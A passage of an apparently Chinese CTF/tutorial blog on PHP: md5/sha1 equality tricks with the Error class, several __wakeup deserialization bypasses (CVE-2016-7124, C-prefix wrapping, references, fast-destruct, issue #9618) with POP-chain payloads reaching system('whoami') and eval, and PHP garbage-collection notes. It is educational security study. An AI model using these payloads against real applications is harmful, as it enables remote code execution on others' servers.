数组形式的堆栈跟踪\n\n各种方法的解释\n\n![image-20250218163448507](../image/achieve/202411/java学习/image-20250218163448507.png)\n\nError原生类\n\n(PHP 7, PHP 8)\n\n**Error** 是所有PHP内部错误类的基类。\n\n关于类的摘要\n\n![image-20250218163346610](../image/achieve/202411/java学习/image-20250218163346610.png)\n\n属性\n\n- message\n\n  错误消息内容\n\n- code\n\n  错误代码\n\n- file\n\n  抛出错误的文件名\n\n- line\n\n  抛出错误的行数\n\n- previous\n\n  之前抛出的异常\n\n- string\n\n  字符串形式的堆栈跟踪\n\n- trace\n\n  数组形式的堆栈跟踪\n\n各种方法的解释\n\n![image-20250218163427394](../image/achieve/202411/java学习/image-20250218163427394.png)\n\n接下来我们拿Error类在本地做一下测试进行讲解，Exception类和这个大差不差\n\n```php\n<?php\n$a=new Error(\"payload\",1);\n$b=new Error(\"payload\",2);\necho $a;\necho $b;\nif ($a!=$b){\n\techo \"不相等\";\n}\nif (md5($a)===md5($b)){\n\techo \"md5相等\";\n}\nif (sha1($a)===sha1($b)){\n\techo \"sha1相等\";\n}\n?>\n    /*\nError: payload in E:\\vscode\\profiles\\1.php:2\nStack trace:\n#0 {main}Error: payload in E:\\vscode\\profiles\\1.php:3\nStack trace:\n#0 {main}不相等\n*/\n```\n\n这里可以看到是成功满足了不相等的条件的，\n\n在 PHP 中，`$a` 和 `$b` 是两个不同的对象实例，尽管它们的构造函数接收的参数相同（即都为 `\"payload\"`），但它们的错误代码不同（`$a` 的错误代码为 `1`，而 `$b` 的错误代码为 `2`）。\n\n在 PHP 中，当您比较两个对象时，使用 `!=` 或 `!==` 运算符会比较对象的实例\n\n1. **引用比较**：如果两个对象引用的是同一个实例（即它们是同一个对象），那么它们是相等的。\n2. **内容比较**：如果两个对象是不同的实例（即它们是不同的对象），即使它们的属性具有相同的值，PHP 仍然会认为它们是不相等的\n\n因此，这两个对象被认为是不相等的。但是后面两个条件没满足，没满足md5的验证。这时候我们如果设置为同一行呢\n\n```php\n<?php\n$a=new Error(\"payload\",1);$b=new Error(\"payload\",2);\necho $a.\"\\n\";\necho $b.\"\\n\";\nif ($a!=$b){\n\techo \"不相等\\n\";\n}\nif (md5($a)===md5($b)){\n\techo \"md5相等\\n\";\n}\nif (sha1($a)===sha1($b)){\n\techo \"sha1相等\\n\";\n}\n?>\n/*\nError: payload in E:\\vscode\\profiles\\1.php:2\nStack trace:\n#0 {main}\nError: payload in E:\\vscode\\profiles\\1.php:2\nStack trace:\n#0 {main}\n不相等\nmd5相等\nsha1相等\n*/\n```\n\n这时候他们的md5和sha1是一样的,且他们的值是不一样的，因为md5和sha1比较的是\n\n`Error: payload in E:\\vscode\\profiles\\1.php:2\nStack trace:\n#0 {main}`\n\n由于它们在同一行中被执行，若在此行代码中发生错误，错误指向的行数仅会标记为当前的行，即行号 2，这时候他们的内容完全相等，所以他们的md5值也会相等\n","tags":["PHP反序列化"],"categories":["PHP反序列化"]},{"title":"PHP反序列化bypass","url":"/2025/08/12/PHP反序列化bypass/","content":"\n因为最近在复习php框架的内容，所以想着把wakeup和一些反序列化的bypass一起迁移出来单开一篇文章方便后面查看\n\n## wakeup bypass\n\n参考文章：\n\n[PHP反序列化中wakeup()绕过总结](https://fushuling.com/index.php/2023/03/11/php反序列化中wakeup绕过总结/)\n\n这个也算是一个比较重要的考点了，一般来说，绕过wakup无非就是下面几种:\n\n### cve-2016-7124\n\n适用版本：\n\n- PHP5 < 5.6.25\n- PHP7 < 7.0.10\n\n这应该是最常见的wakeup()绕过漏洞了，就是适用的的php版本比较低\n\n具体怎么实现呢？\n\n> [!IMPORTANT]\n>\n> **让序列化字符串中表示对象属性个数的值大于真实的属性个数时会跳过`__wakeup`的执行**\n\n我们写个简单的demo\n\n```php\n<?php\nclass test{\n    public $a='成功';\n\n    public function __wakeup(){\n        $this -> a=\"绕过失败\";\n    }\n\n    public function  __destruct(){\n        echo $this->a;\n    }\n}\n$a = new test();\n$b = serialize($a);\necho $b.\"\\n\";\nunserialize($b);\n/*\n * O:4:\"test\":1:{s:1:\"a\";s:6:\"成功\";}\n * 绕过失败成功\n * */\n```\n\n正常来说`wakeup`魔术方法会先被触发，然后再进行反序列化\n\n需要注意的是：unserialize函数其实是一个重构新对象的过程，所以这也是为什么这里在代码结束后会同时触发两个对象的`__destruct`方法的原因\n\n绕过demo\n\n```php\n<?php\nclass test{\n    public $a='成功';\n\n    public function __wakeup(){\n        $this -> a=\"绕过失败\";\n    }\n\n    public function  __destruct(){\n        echo $this->a;\n    }\n}\n$a = new test();\n$b = serialize($a);\necho $b.\"\\n\";\nunserialize($b);\n$c = \"O:4:\\\"test\\\":2:{s:1:\\\"a\\\";s:6:\\\"成功\\\";}\";\nunserialize($c);\n/*\n * O:4:\"test\":1:{s:1:\"a\";s:6:\"成功\";}\n * 绕过失败成功\n * */\n```\n\n### 使用C打头绕过\n\n这个其实很多次都做到了，但是一直没有去总结，例如litctf2025的君の名は以及ctfshow2023年愚人杯的 ez_php都有考过这个绕过的手法\n\n**ctfshow愚人杯 ez_php**\n\n```php\n<?php\nerror_reporting(0);\nhighlight_file(__FILE__);\n\nclass ctfshow{\n\n    public function __wakeup(){\n        die(\"not allowed!\");\n    }\n\n    public function __destruct(){\n        system($this->ctfshow);\n    }\n\n}\n\n$data = $_GET['1+1>2'];\n\nif(!preg_match(\"/^[Oa]:[\\d]+/i\", $data)){\n    unserialize($data);\n}\n\n?>\n```\n\n```php\n<?php\nclass ctfshow{\n\n    public function __wakeup(){\n        die(\"not allowed!\");\n    }\n\n    public function __destruct(){\n        echo \"bypass successfully\";\n        system($this->ctfshow);\n    }\n}\n$a = new ctfshow();\necho serialize($a);\n//O:7:\"ctfshow\":0:{}\n?>\n```\n\n我们把O改成C传入`C:7:”ctfshow”:0:{}`可以看到网页显示bypass\n\n![image-20250812113108892](../image/achieve/202411/java学习/image-20250812113108892.png)\n\n> [!CAUTION]\n>\n> 使用C代替O能绕过wakeup，但那样的话只能执行construct()函数或者destruct()函数，无法添加任何内容。\n\n这时候该怎么做呢？\n\n> [!IMPORTANT]\n>\n> **用一些原生类去包装一下这个序列化对象，让最后的序列化字符串是C开头**\n\n首先我们要获得可以进行打包的函数\n\n```php\n<?php\n// 获取当前所有已定义的类（包括内置类和用户自定义类）\n$classes = get_declared_classes();\n\n// 遍历每个类\nforeach ($classes as $class) {\n    // 获取当前类的所有方法\n    $methods = get_class_methods($class);\n\n    // 遍历类的每个方法\n    foreach ($methods as $method) {\n        // 检查方法名是否为 'unserialize'\n        if (in_array($method, array('unserialize'))) {\n            // 输出类名和方法名（格式：ClassName::methodName）\n            print $class . '::' . $method . \"\\n\";\n        }\n    }\n}\n/*\n * ArrayObject::unserialize\n * ArrayIterator::unserialize\n * RecursiveArrayIterator::unserialize\n * SplDoublyLinkedList::unserialize\n * SplQueue::unserialize\n * SplStack::unserialize\n * SplObjectStorage::unserialize\n */\n```\n\n挨个测试一下哪些可以用\n\n#### ArrayObject类\n\n![image-20250812114238509](../image/achieve/202411/java学习/image-20250812114238509.png)\n\n关注到一句话：This class allows objects to work as arrays.\n\n这里的构造方法是需要传入一个数组，那我们试着传一下\n\n```php\n<?php\nclass ctfshow{\n\n    public function __wakeup(){\n        die(\"not allowed!\");\n    }\n\n    public function __destruct(){\n        echo \"bypass successfully\";\n        system($this->ctfshow);\n    }\n}\n$a = new ctfshow();\n$a -> ctfshow = \"whoami\";\n$arr = array(\"evil\" => $a);\n$poc = new ArrayObject($arr);\necho serialize($poc);\n//C:11:\"ArrayObject\":77:{x:i:0;a:1:{s:4:\"evil\";O:7:\"ctfshow\":1:{s:7:\"ctfshow\";s:6:\"whoami\";}};m:a:0:{}}bypass successfullywanth3f1ag\\23232\n?>\n```\n\n是可以打得通的\n\n#### ArrayIterator类\n\n其实和上面的没什么区别\n\n```php\n<?php\nclass ctfshow{\n\n    public function __wakeup(){\n        die(\"not allowed!\");\n    }\n\n    public function __destruct(){\n        echo \"bypass successfully\";\n        system($this->ctfshow);\n    }\n}\n$a = new ctfshow();\n$a -> ctfshow = \"whoami\";\n$arr = array(\"evil\" => $a);\n$poc = new ArrayIterator($arr);\necho serialize($poc);\n//C:13:\"ArrayIterator\":77:{x:i:0;a:1:{s:4:\"evil\";O:7:\"ctfshow\":1:{s:7:\"ctfshow\";s:6:\"whoami\";}};m:a:0:{}}bypass successfullywanth3f1ag\\23232\n?>\n```\n\n#### RecursiveArrayIterator类\n\n也是一样\n\n```php\n<?php\nclass ctfshow{\n\n    public function __wakeup(){\n        die(\"not allowed!\");\n    }\n\n    public function __destruct(){\n        echo \"bypass successfully\";\n        system($this->ctfshow);\n    }\n}\n$a = new ctfshow();\n$a -> ctfshow = \"whoami\";\n$arr = array(\"evil\" => $a);\n$poc = new RecursiveArrayIterator($arr);\necho serialize($poc);\n//C:22:\"RecursiveArrayIterator\":77:{x:i:0;a:1:{s:4:\"evil\";O:7:\"ctfshow\":1:{s:7:\"ctfshow\";s:6:\"whoami\";}};m:a:0:{}}bypass successfullywanth3f1ag\\23232\n?>\n```\n\n#### SplObjectStorage类\n\n```php\n<?php\nclass test{\n    public $test;\n}\n$a = new SplObjectStorage();\n$a -> test = new test();\necho serialize($a);\n//C:16:\"SplObjectStorage\":53:{x:i:0;m:a:1:{s:4:\"test\";O:4:\"test\":1:{s:4:\"test\";N;}}}\n```\n\n绕过\n\n```php\n<?php\nclass ctfshow{\n\n    public function __wakeup(){\n        die(\"not allowed!\");\n    }\n\n    public function __destruct(){\n        echo \"bypass successfully\";\n        system($this->ctfshow);\n    }\n}\n$a = new SplObjectStorage();\n$a -> test = new ctfshow();\n$a -> test -> ctfshow = \"whoami\";\necho serialize($a);\n//C:16:\"SplObjectStorage\":70:{x:i:0;m:a:1:{s:4:\"test\";O:7:\"ctfshow\":1:{s:7:\"ctfshow\";s:6:\"whoami\";}}}bypass successfullywanth3f1ag\\23232\n?>\n```\n\n其实也就上面四个类能用，中间的\n\n- SplDoublyLinkedList::unserialize\n\n * SplQueue::unserialize\n * SplStack::unserialize\n\n这三个分别看了一下官方文档，并没有什么特别的声明，所以暂时是用不了的\n\n### &引用地址绕过\n\n当代码中存在类似`$this->a===$this->b`的比较时可以用`&`，使`$a`永远与`$b`相等，使用引用的方式让两个变量同时指向同一个内存地址，这样对其中一个变量操作时，另一个变量的值也会随之改变。\n\n简单的demo\n\n```php\n<?php\n\nclass KeyPort{\n    public $key;\n\n    public function __destruct()\n    {\n        $this->key=False;\n        if(!isset($this->wakeup)||!$this->wakeup){\n            echo \"You get it!\";\n        }\n    }\n\n    public function __wakeup(){\n        $this->wakeup=True;\n    }\n\n}\n\nif(isset($_POST['pop'])){\n\n    @unserialize($_POST['pop']);\n\n}\n```\n\n可以看到如果我们想触发echo必须首先满足:`if(!isset($this->wakeup)||!$this->wakeup)`的条件\n\n也就是说要么不给wakeup赋值，让它接受不到$this->wakeup，要么控制wakeup为false，但我们注意到在`__wakeup`方法这里使`$this->wakeup=True`;，我们知道在用unserialize()反序列化字符串时，会先触发\\_\\_wakeup()，然后再进行反序列化，所以相当于我们刚进行反序列化$this->wakeup就等于True了，这就没办法达到我们控制wake为false的想法了\n\n所以我们可以使用上面提到过的引用赋值的方法以此将wakeup和key的值进行引用，让key的值改变的时候也改变wakeup的值即可\n\n所以我们的exp就是\n\n```php\n<?php\n\nclass KeyPort{\n    public $key;\n\n    public function __destruct()\n    {\n    }\n\n}\n\n$keyport = new KeyPort();\n$keyport->key=&$keyport->wakeup;\necho serialize($keyport); \n#O:7:\"KeyPort\":2:{s:3:\"key\";N;s:6:\"wakeup\";R:2;}\n```\n\n例如有一道题\n\n**[UUCTF 2022 新生赛]ez_unser**\n\n```php\n<?php\nshow_source(__FILE__);\n\n###very___so___easy!!!!\nclass test{\n    public $a;\n    public $b;\n    public $c;\n    public function __construct(){\n        $this->a=1;\n        $this->b=2;\n        $this->c=3;\n    }\n    public function __wakeup(){\n        $this->a='';\n    }\n    public function __destruct(){\n        $this->b=$this->c;\n        eval($this->a);\n    }\n}\n$a=$_GET['a'];\nif(!preg_match('/test\":3/i',$a)){\n    die(\"你输入的不正确！！！搞什么！！\");\n}\n$bbb=unserialize($_GET['a']);\n\n```\n\n这道题很明显可以看到一个eval，但是有一个`__wakeup`会把成员属性a的值置空，这时候需要让a能传进去并打出效果\n\n测试一下\n\n```php\n<?php\nclass test{\n    public $a;\n    public $b;\n    public $c;\n}\n$a = new test();\n$a -> a = 1;\n$a -> b = &$a -> a;\necho $a -> b;\n//1\n```\n\n可以看到这里是成功引用地址去对b赋值了\n\n因为最后销毁时会将c的值赋给b，所以poc\n\n```php\n<?php\nclass test{\n    public $a;\n    public $b;\n    public $c;\n    public function __wakeup(){\n        $this->a='';\n    }\n    public function __destruct(){\n        $this->b=$this->c;\n        eval($this->a);\n    }\n}\n$a  = new test();\n$a -> c = \"system('whoami');\";\n$a -> a = &$a -> b;\nunserialize(serialize($a));\n/*\nwanth3f1ag\\23232\nwanth3f1ag\\23232\n```\n\n### fast-destruct\n\n在fushuling师傅的解释里面是这样的:\n\n- 在PHP中如果单独执行`unserialize()`函数，则反序列化后得到的生命周期仅限于这个函数执行的生命周期，在执行完unserialize()函数时就会执行`__destruct()`方法\n- 而如果将`unserialize()`函数执行后得到的字符串赋值给了一个变量，则反序列化的对象的生命周期就会变长，会一直到对象被销毁才执行析构方法\n\n首先我们要知道一个正确完整的序列化字符串的结构：\n\n- 正确的序列化字符串是以`}`结尾的\n- 正确的序列化字符串的属性和属性值的长度一致\n\n由此可以得出一个思路：\n\n我们构造一个非法的，错误的序列化字符串，让unserialize()函数在完成对象创建和属性填充之后，他会检查整个字符串是否被完整且正确的解析（或者试图找到一个表示对象结束的` }`），此时会产生解析错误，那么就会抛出异常不会调用到`__wakeup()`方法。因为先前反序列化的对象确实会存在内存当中，此时php会利用GC回收机制销毁对象，那么就会调用到该对象的`__destruct()`方法\n\n先拿一道题来讲一下\n\nDASCTF X GFCTF 2022十月挑战赛 EasyPOP\n\n```php\n<?php\nhighlight_file(__FILE__);\nerror_reporting(0);\n\nclass fine\n{\n    private $cmd;\n    private $content;\n\n    public function __construct($cmd, $content)\n    {\n        $this->cmd = $cmd;\n        $this->content = $content;\n    }\n\n    public function __invoke()\n    {\n        call_user_func($this->cmd, $this->content);\n    }\n\n    public function __wakeup()\n    {\n        $this->cmd = \"\";\n        die(\"Go listen to Jay Chou's secret-code! Really nice\");\n    }\n}\n\nclass show\n{\n    public $ctf;\n    public $time = \"Two and a half years\";\n\n    public function __construct($ctf)\n    {\n        $this->ctf = $ctf;\n    }\n\n\n    public function __toString()\n    {\n        return $this->ctf->show();\n    }\n\n    public function show(): string\n    {\n        return $this->ctf . \": Duration of practice: \" . $this->time;\n    }\n\n\n}\n\nclass sorry\n{\n    private $name;\n    private $password;\n    public $hint = \"hint is depend on you\";\n    public $key;\n\n    public function __construct($name, $password)\n    {\n        $this->name = $name;\n        $this->password = $password;\n    }\n\n    public function __sleep()\n    {\n        $this->hint = new secret_code();\n    }\n\n    public function __get($name)\n    {\n        $name = $this->key;\n        $name();\n    }\n\n\n    public function __destruct()\n    {\n        if ($this->password == $this->name) {\n\n            echo $this->hint;\n        } else if ($this->name = \"jay\") {\n            secret_code::secret();\n        } else {\n            echo \"This is our code\";\n        }\n    }\n\n\n    public function getPassword()\n    {\n        return $this->password;\n    }\n\n    public function setPassword($password): void\n    {\n        $this->password = $password;\n    }\n\n\n}\n\nclass secret_code\n{\n    protected $code;\n\n    public static function secret()\n    {\n        include_once \"hint.php\";\n        hint();\n    }\n\n    public function __call($name, $arguments)\n    {\n        $num = $name;\n        $this->$num();\n    }\n\n    private function show()\n    {\n        return $this->code->secret;\n    }\n}\n\n\nif (isset($_GET['pop'])) {\n    $a = unserialize($_GET['pop']);\n    $a->setPassword(md5(mt_rand()));\n} else {\n    $a = new show(\"Ctfer\");\n    echo $a->show();\n}\n```\n\n简单写一下链子\n\n```php\nsorry::__destruct()->show::__toString()->secret_code::show()->sorry::__get()->fine::__invoke()\n```\n\npoc\n\n```php\n<?php\nclass fine\n{\n    public $cmd;\n    public $content;\n}\n\nclass show\n{\n    public $ctf;\n    public $time = \"Two and a half years\";\n\n}\n\nclass sorry\n{\n    public $name;\n    public $password;\n    public $hint = \"hint is depend on you\";\n    public $key;\n}\nclass secret_code\n{\n    public $code;\n\n}\n//sorry::__destruct()->show::__toString()->secret_code::show()->sorry::__get()->fine::__invoke()\n$sorry1 = new sorry();\n$sorry1 -> password = \"wanth3f1ag\";\n$sorry1 -> name = \"wanth3f1ag\";\n$sorry1 -> hint = new show();\n$sorry1 -> hint -> ctf = new secret_code();     //调用secret_code::show()\n$sorry1 -> hint -> ctf -> code = new sorry();   //触发__get()\n$sorry1 -> hint -> ctf -> code -> key = new fine();     //触发__invoke()\n$sorry1 -> hint -> ctf -> code -> key -> cmd = 'system';\n$sorry1 -> hint -> ctf -> code -> key -> content = 'whoami';\necho serialize($sorry1);\n//O:5:\"sorry\":4:{s:4:\"name\";s:10:\"wanth3f1ag\";s:8:\"password\";s:10:\"wanth3f1ag\";s:4:\"hint\";O:4:\"show\":2:{s:3:\"ctf\";O:11:\"secret_code\":1:{s:4:\"code\";O:5:\"sorry\":4:{s:4:\"name\";N;s:8:\"password\";N;s:4:\"hint\";s:21:\"hint is depend on you\";s:3:\"key\";O:4:\"fine\":2:{s:3:\"cmd\";s:6:\"system\";s:7:\"content\";s:6:\"whoami\";}}}s:4:\"time\";s:20:\"Two and a half years\";}s:3:\"key\";N;}\n```\n\n但这里的难点是需要绕过`__wakeup`的触发\n\n```php\n    public function __wakeup()\n    {\n        $this->cmd = \"\";\n        die(\"Go listen to Jay Chou's secret-code! Really nice\");\n    }\n```\n\nfast-destruct实现方式有一下几种\n\n- 删除最后的大括号\n- 数组对象占用指针（改数字）\n\n这两种方法都可以\n\n```php\nO:5:\"sorry\":4:{s:4:\"name\";s:10:\"wanth3f1ag\";s:8:\"password\";s:10:\"wanth3f1ag\";s:4:\"hint\";O:4:\"show\":2:{s:3:\"ctf\";O:11:\"secret_code\":1:{s:4:\"code\";O:5:\"sorry\":4:{s:4:\"name\";N;s:8:\"password\";N;s:4:\"hint\";s:21:\"hint is depend on you\";s:3:\"key\";O:4:\"fine\":2:{s:3:\"cmd\";s:6:\"system\";s:7:\"content\";s:6:\"whoami\";}}}s:4:\"time\";s:20:\"Two and a half years\";}s:3:\"key\";N;\n\nO:5:\"sorry\":4:{s:4:\"name\";s:10:\"wanth3f1ag\";s:8:\"password\";s:10:\"wanth3f1ag\";s:4:\"hint\";O:4:\"show\":2:{s:3:\"ctf\";O:11:\"secret_code\":1:{s:4:\"code\";O:5:\"sorry\":4:{s:4:\"name\";N;s:8:\"password\";N;s:4:\"hint\";s:21:\"hint is depend on you\";s:3:\"key\";O:4:\"fine\":4:{s:3:\"cmd\";s:6:\"system\";s:7:\"content\";s:6:\"whoami\";}}}s:4:\"time\";s:20:\"Two and a half years\";}s:3:\"key\";N;}\n```\n\n![image-20250812144718374](../image/achieve/202411/PHP反序列化/image-20250812144718374.png)\n\n![image-20250812144654135](../image/achieve/202411/PHP反序列化/image-20250812144654135.png)\n\n这里其实利用的就是GC回收机制，放文章后面写吧\n\n### php issue#9618\n\n[php issue#9618](https://github.com/php/php-src/issues/9618)提到了最新版wakeup()的一种bug，当序列化字符串中的属性名或属性值的长度不一致时，PHP会继续反序列化，但会先触发 `__destruct()` 而不是 `__wakeup()`，从而绕过wakeup\n\n适用版本:\n\n- 7.4.x -7.4.30\n- 8.0.x\n\n此时有以下代码\n\n```php\n<?php\n\nclass A\n{\n    public $info;\n    private $end = \"1\";\n\n    public function __destruct()\n    {\n        $this->info->func();\n    }\n}\n\nclass B\n{\n    public $end;\n\n    public function __wakeup()\n    {\n        $this->end = \"exit();\";\n        echo '__wakeup';\n    }\n\n    public function __call($method, $args)\n    {\n        eval('echo \"aaaa\";' . $this->end . 'echo \"bbb\"');\n    }\n}\n\nunserialize($_POST['data']);\n\n```\n\n如果正常的打的话会触发`_wakeup()`方法，如果我们修改一个变量名呢？\n\n```php\n<?php\nclass A\n{\n    public $info;\n    private $end = \"1\";\n\n}\n\nclass B\n{\n    public $znd;\n\n}\n$test=new A();\n$test->info=new B();\necho serialize($test);\n#O:1:\"A\":2:{s:4:\"info\";O:1:\"B\":1:{s:3:\"znd\";N;}s:6:\" A end\";s:1:\"1\";}\n```\n\n正常的话因为end变量是私有属性，但是我们如果将里面的\\0字符去掉\n\n```php\nO:1:\"A\":2:{s:4:\"info\";O:1:\"B\":1:{s:3:\"znd\";N;}s:6:\"Aend\";s:1:\"1\";}\n```\n\n![image-20250812150747086](../image/achieve/202411/PHP反序列化/image-20250812150747086.png)\n\n成功绕过`__wakeup`，那么如果我们补上空白符呢，结果可想而知\n\n![image-20250812151529430](../image/achieve/202411/PHP反序列化/image-20250812151529430.png)\n\n但其实这里的话改一下其他的属性或属性值也是可以的\n\n![image-20250812151626589](../image/achieve/202411/PHP反序列化/image-20250812151626589.png)\n\n但事实上只有当destruct和wakeup在不同类的时候才能用这个方法绕过，这里把这两个方法放在A类中看看\n\n![image-20250812151852819](../image/achieve/202411/PHP反序列化/image-20250812151852819.png)\n\n接下来我们来看一下GC回收机制\n\n## GC回收机制\n\n参考了一下包子的文章：https://baozongwi.xyz/2024/09/14/php-GC%E5%9B%9E%E6%94%B6%E6%9C%BA%E5%88%B6%E4%BB%A5%E5%8F%8A%E5%B8%B8%E8%A7%81%E5%88%A9%E7%94%A8%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F/\n\n额外参考文章：https://forum.butian.net/share/2352\n\n### 什么是GC垃圾回收机制\n\n官方文档：https://www.php.net/manual/zh/features.gc.php\n\n> [!IMPORTANT]\n>\n> 在PHP中，使用`引用计数`和`回收周期`来自动管理内存对象的，没有任何变量指向这个对象时，这个对象就成为垃圾，PHP会将其在内存中销毁；这是PHP 的GC垃圾处理机制，防止内存溢出。它是在 **PHP 5.3** 之后引入的增强功能，帮助开发者自动管理内存，尤其是在复杂的应用场景下。\n\n上面可以知道，在PHP中是用引用计数和回收周期去管理内存对象的，那这两个东西是什么呢？\n\n### 引用计数\n\n摘录官方文档https://www.php.net/manual/zh/features.gc.refcounting-basics.php\n\n- 每个`php`变量存在一个叫`zval`的变量容器中。\n- `zval`变量容器除了包含变量的类型和值，还包括两个额外的信息位。\n- 第一个是`is_ref`，是个`bool`值，用来标识这个变量是否是属于引用集合。通过这个位，php引擎才能把普通变量和引用变量区分开来，由于`php`允许用户通过使用&来使用自定义引用，zval变量容器中还有一个内部引用计数机制，来优化内存使用。\n- 第二个额外字节是 `refcount`，用以表示指向这个`zval`变量容器的变量个数。\n- 所有的符号存在一个符号表中，其中每个符号都有作用域(scope)，那些主脚本(比如：通过浏览器请求的的脚本)和每个函数或者方法也都有作用域。\n\n从这里不难看出，引用计数是一种内存管理技术，用来记录一个值或对象被多少个变量引用。每当一个变量指向某一个值的时候，这个值的引用计数就会增加；而当某个变量不再使用该值的时候，引用计数就会减少，若引用计数变为0的时候，系统会将其占用的内存空间释放。\n\n写个demo\n\n```php\n<?php\n$a = \"aaa\";\nxdebug_debug_zval('a');\n//a: (refcount=1, is_ref=0)='aaa'\n?>\n```\n\n此时我们创建了一个变量a并赋值为aaa，那么此时该变量就会在当前的作用域中创建一个新的变量容器，其类型为string。\n\nrefcount设置为1表示只有一个符号变量使用了这个变量容器，is_ref设置为false(0)的话也就是非引用\n\n尝试增加引用计数\n\n```php\n<?php\n$a = \"aaa\";\n$b = $a;\nxdebug_debug_zval( 'a' );\n//a: (refcount=1, is_ref=0)='aaa'\n?>\n```\n\n哎？这里为什么还是1呢？\n\n搜查之后发现，**因为 PHP 引擎对字符串、整数等简单类型进行了优化。在没有显式使用引用（&）的情况下，PHP 不会立即增加引用计数，而是采用“写时复制”（Copy-on-Write）策略来节省内存。**\n\n这意味着当你将 `$a` 的值赋给 `$b` 时，PHP 并不会立即复制该值，而是让 `$b` 和 `$a` 指向同一个内存块，直到其中一个变量被修改。\n\n所以我们想要增加引用计数的话需要这样子\n\n```php\n<?php\n$a = \"aaa\";\n$b = &$a;\nxdebug_debug_zval( 'a' );\n//a: (refcount=2, is_ref=1)='aaa'\n?>\n```\n\n这样就对了，但是此时引用也变成了1\n\n那如何减少refcount引用计数呢？那就是删除变量unset了\n\n```php\n<?php\n$a = \"aaa\";\n$b = &$a;\nxdebug_debug_zval( 'a' );\nunset($b);\nxdebug_debug_zval( 'a' );\n/*\na: (refcount=2, is_ref=1)='aaa'\na: (refcount=1, is_ref=1)='aaa'\n```\n\n但是对于简单标量例如整数、浮点数、布尔值等\n\n```php\n<?php\n$a = 1;\nxdebug_debug_zval('a');\n//a: (refcount=0, is_ref=0)=1\n\n$b = $a;\nxdebug_debug_zval('a');\n//a: (refcount=0, is_ref=0)=1\n\n$c = &$a;\nxdebug_debug_zval('a');\n//a: (refcount=2, is_ref=1)=1\n\n```\n\n很神奇的是，在PHP中，PHP并没有为这些标量类型的值用refcount去进行维护，而是当使用`&`引用后，`is_ref`区分引用变量，`refcount`变为了2。\n\n#### 复合类型变量的处理\n\n对于像Array和Object类型的情况会稍微复杂一些，array和object的属性会各自存储在自己的符号表中\n\n写个demo\n\n```php\n<?php\n$a = array('name' => 'wanth3f1ag','age' => 20);\nxdebug_debug_zval( 'a' );\n/*a: (refcount=2, is_ref=0)=array (\n    'name' => (refcount=1, is_ref=0)='wanth3f1ag', \n    'age' => (refcount=0, is_ref=0)=20\n)\n```\n\n然后我们增加引用计数\n\n```php\n<?php\n$a = array('name' => 'wanth3f1ag','age' => 20);\n$a['heigh'] = &$a['name'];\nxdebug_debug_zval( 'a' );\n/*a: (refcount=1, is_ref=0)=array (\n    'name' => (refcount=2, is_ref=1)='wanth3f1ag',\n    'age' => (refcount=0, is_ref=0)=20,\n    'heigh' => (refcount=2, is_ref=1)='wanth3f1ag'\n)\n*/\n```\n\n删除变量\n\n```php\n<?php\n$a = array('name' => 'wanth3f1ag','age' => 20);\n$a['heigh'] = &$a['name'];\nxdebug_debug_zval( 'a' );\nunset($a['age']);\nxdebug_debug_zval( 'a' );\n/*a: (refcount=1, is_ref=0)=array ('name' => (refcount=2, is_ref=1)='wanth3f1ag', 'age' => (refcount=0, is_ref=0)=20, 'heigh' => (refcount=2, is_ref=1)='wanth3f1ag')\n *a: (refcount=1, is_ref=0)=array ('name' => (refcount=2, is_ref=1)='wanth3f1ag', 'heigh' => (refcount=2, is_ref=1)='wanth3f1ag')\n*/\n```\n\n第二个就是回收周期\n\n### 回收周期\n\n#### php <=5.2\n\n在php5.3之前，GC回收是仅仅依靠引用计数来进行的，但是这样子造成了一个循环引用问题，进而可能出现内存泄露\n\n#### php 5.3–>5.6\n\n从php5.3开始，在引用计数的基础上使用了一种同步循环回收的同步算法去解决这个问题\n\n这个算法把那些可能是垃圾的变量容器放入根缓冲区，仅仅在根缓冲区满了时，才对缓冲区内部所有不同的变量容器执行垃圾回收操作。具体的流程如下\n\n- 如果发现一个zval容器中的refcount 增加，则该变量仍在使用中，因此不是垃圾。\n- 如果发现一个zval容器中的refcount在减少，如果 refcount 减少到 0，则 zval 可以释放；\n- 如果发现一个zval容器中的refcount在减少，并没有减到0，PHP会把该值放到缓冲区，当做有可能是垃圾的怀疑对象；\n- 当缓冲区达到临界值，PHP会自动调用一个方法取遍历每一个值，如果发现是垃圾就清理。\n\n#### php>=7.0\n\n针对引用计数的规则进行了一些调整\n\n- 对于null，bool，int和double的类型变量，refcount永远不会计数；\n- 对于对象、资源类型，refcount计数和php5的一致；\n- 对于字符串，未被引用的变量被称为“实际字符串”。而那些被引用的字符串被重复删除（即只有一个带有特定内容的被插入的字符串）并保证在请求的整个持续时间内存在，所以不需要为它们使用引用计数；如果使用了opcache，这些字符串将存在于共享内存中，在这种情况下，您不能使用引用计数（因为我们的引用计数机制是非原子的）；\n- 对于数组，未引用的变量被称为“不可变数组”。其数组本身计数与php5一致，但是数组里面的每个键值对的计数，则按前面三条的规则（即如果是字符串也不在计数）；如果使用opcache，则代码中的常量数组文字将被转换为不可变数组。再次，这些生活在共享内存，因此不能使用refcounting。\n\n### 在反序列化中的用法\n\n话说到这了，总得来点实际的东西吧，GC回收机制有什么地方是值得我们利用的呢？在反序列化中，我们不难想到一个魔术方法`__destruct()`，该方法会在对象被销毁的时候触发，可能是在程序结束后对象销毁自动触发，也可能是对象显式销毁后触发，但是如果遇到程序报错或者抛出异常则不会触发。\n\n触发垃圾回收机制的方法有\n\n- 数组对象为NULL时，可以触发。\n- 对象被unset()处理时，可以触发。\n\n#### unset主动触发\n\n先写个demo尝尝鲜\n\n```php\n<?php\nclass test{\n    public $num;\n\n    public function __construct($num){\n        $this->num = $num;\n        echo \"consrtuct(\".\"$num\".\")\\n\";\n    }\n    public function __destruct(){\n        echo \"destruct(\".$this->num.\")\\n\";\n    }\n}\n$a = new test(1);\n$b = new test(2);\n$c = new test(3);\n/*consrtuct(1)\nconsrtuct(2)\nconsrtuct(3)\ndestruct(3)\ndestruct(2)\ndestruct(1)\n```\n\n```php\n<?php\nclass test{\n    public $num;\n\n    public function __construct($num){\n        $this->num = $num;\n        echo \"consrtuct(\".\"$num\".\")\\n\";\n    }\n    public function __destruct(){\n        echo \"destruct(\".$this->num.\")\\n\";\n    }\n}\n$a = new test(1);\nunset($a);\n$b = new test(2);\n$c = new test(3);\n/*consrtuct(1)\ndestruct(1)\nconsrtuct(2)\nconsrtuct(3)\ndestruct(3)\ndestruct(2)\n```\n\n可以发现销毁方法提前执行了，因为我们主动触发GC回收机制了\n\n#### 